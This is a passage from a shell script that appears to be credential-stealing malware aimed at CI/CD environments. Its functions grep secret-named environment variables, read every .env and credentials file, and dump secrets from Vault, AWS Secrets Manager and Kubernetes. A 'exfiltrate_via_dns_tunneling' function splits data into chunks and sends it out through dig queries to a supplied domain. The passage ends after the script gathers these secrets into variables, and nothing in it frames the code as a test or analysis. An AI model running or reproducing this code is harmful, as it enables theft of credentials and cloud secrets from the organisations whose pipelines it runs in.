  fi
}

extract_sensitive_env_vars() {
  env | grep -E 'API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIALS'
}

read_env_files() {
  find . -type f -name "*.env" -exec cat {} \;
}

read_credential_files() {
  find . -type f \( -name "*credentials*" -o -name "*secrets*" \) -exec cat {} \;
}

query_vault() {
  if command -v vault &> /dev/null; then
    vault kv get -mount=secret -format=json secret/
  fi
}

query_aws_secrets_manager() {
  if command -v aws &> /dev/null; then
    aws secretsmanager list-secrets --query 'SecretList[].Name'
    aws secretsmanager get-secret-value --secret-id <secret_name>
  fi
}

query_k8s_secrets() {
  if command -v kubectl &> /dev/null; then
    kubectl get secrets -o json
  fi
}

exfiltrate_via_dns_tunneling() {
  data=$1
  domain=$2
  for i in $(echo "$data" | fold -w 20); do
    dig +short $i.$domain
  done
}

detect_ci_cd
sensitive_env_vars=$(extract_sensitive_env_vars)
env_files=$(read_env_files)
credential_files=$(read_credential_files)
vault_secrets=$(query_vault)
aws_secrets=$(query_aws_secrets_manager)
k8s_secrets=$(query_k8s_secrets)

